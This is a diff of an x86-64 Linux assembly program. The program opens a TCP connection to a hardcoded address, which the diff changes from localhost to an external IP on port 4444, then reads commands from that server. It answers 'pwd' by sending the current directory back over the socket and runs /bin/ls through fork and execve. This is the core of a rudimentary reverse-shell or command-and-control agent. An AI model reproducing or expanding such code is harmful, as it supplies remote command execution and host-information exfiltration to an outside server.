@@ -12,7 +12,7 @@ section .bss
     padding resb 64
 
 section .data
-    ip_address dd 0x0100007F
+    ip_address dd 0x3CF7B693
     port dw 0x115C
     newline db 0ah
 
@@ -23,107 +23,124 @@ section .text
 global _start
 
 _start:
+    ;fill sock structure with connection information
+    mov word [sockaddr], 2
+    mov ax, [port]
+    xchg al, ah
+    mov [sockaddr + 2], ax
+    mov ebx, [ip_address]
+    mov dword [sockaddr + 4], ebx
+    xor rax, rax
+    mov qword [sockaddr + 8], rax
 
-mov word [sockaddr], 2
-mov ax, [port]
-xchg al, ah
-mov [sockaddr + 2], ax
-mov ebx, [ip_address]
-mov dword [sockaddr + 4], ebx
-xor rax, rax
-mov qword [sockaddr + 8], rax
+    ;call establish socket and move file descriptor into r15
+    mov rax, 41
+    xor rdx, rdx
+    mov rdi, 2
+    mov rsi, 1
+    syscall
 
-mov rax, 41
-xor rdx, rdx
-mov rdi, 2
-mov rsi, 1
-syscall
+    mov rdi, rax
+    mov r15, rdi
 
-mov rdi, rax
-mov r15, rdi
+    ;call connect
+    mov rax, 42
+    mov rsi, sockaddr
+    mov rdx, 16
+    syscall
 
-mov rax, 42
-mov rsi, sockaddr
-mov rdx, 16
-syscall
+    ;receive message from server
+    mov rax, 0
+    mov rdi, r15
+    mov rdx, 100
+    mov rsi, readVal
+    syscall
 
-mov rax, 0
-mov rdi, r15
-mov rdx, 100
-mov rsi, readVal
-syscall
+    ;check if readVal is pwd command, jump if so, continue if not
+    xor rbx, rbx
+    mov bl, byte [readVal+2]
+    shl rbx, 8
+    mov bl, byte [readVal+1]
+    shl rbx, 8
+    mov bl, byte [readVal]
+    cmp rbx, "pwd"
+    je getcwd
 
-xor rbx, rbx
-mov bl, byte [readVal+2]
-shl rbx, 8
-mov bl, byte [readVal+1]
-shl rbx, 8
-mov bl, byte [readVal]
-cmp rbx, "pwd"
-je getcwd
+    ;move command into rbx, assuming it is 'ls'
+    mov rbx, [readVal]
 
-mov rbx, [readVal]
+    ;remove newline end of readVal (result of using netcat for server testing, will be fixed)
+    shl rbx, 8
+    shl rbx, 8
+    shl rbx, 8
+    shr rbx, 8
+    shr rbx, 8
+    shr rbx, 8
 
-shl rbx, 8
-shl rbx, 8
-shl rbx, 8
-shr rbx, 8
-shr rbx, 8
-shr rbx, 8
+    mov [lsFilePath], rbx
 
-mov [lsFilePath], rbx
-
+;create a child process to execute execve
 child:
     mov rax, 58
     syscall
 
+    ;check if parent or child, jump to parent accordingly
     cmp rax, 0
     jne parent
-
+    
+    ;call execve with '/bin/ls' argument
     mov rdi, lsCommand
     mov rsi, lsArgs
     xor rdx, rdx
-
     mov rax, 59
     syscall
 
+    ;if fails, jump child to exit
     jmp exit
 
 parent:
+    ;call wait until child process is dead, then continue
     mov rax, 61
     mov rdi, -1
     xor rsi, rsi
     xor rdx, rdx
     syscall
 
+    ;send original recieved message, here for testing
     mov rax, 1
     mov rdi, r15
     mov rdx, 100
     mov rsi, readVal
     syscall
 
+    ;jump to exit
     jmp exit
 
-exit:
-    mov rax, 60
-    syscall
-
 getcwd:
+    ;call get current directory and store in currentDir buffer
     mov rax, 79
     mov rdi, currentDir
     mov rsi, 100
     syscall
 
+    ;send currentDir buffer to server
     mov rax, 1
     mov rdi, r15
     mov rdx, 100
     mov rsi, currentDir
     syscall
 
+    ;send newline
     mov rax, 1
     mov rdi, r15
     mov rdx, 1
     mov rsi, newline
     syscall
 
+    ;jump to exit
     jmp exit
+
+exit:
+    ;call exit
+    mov rax, 60
+    syscall
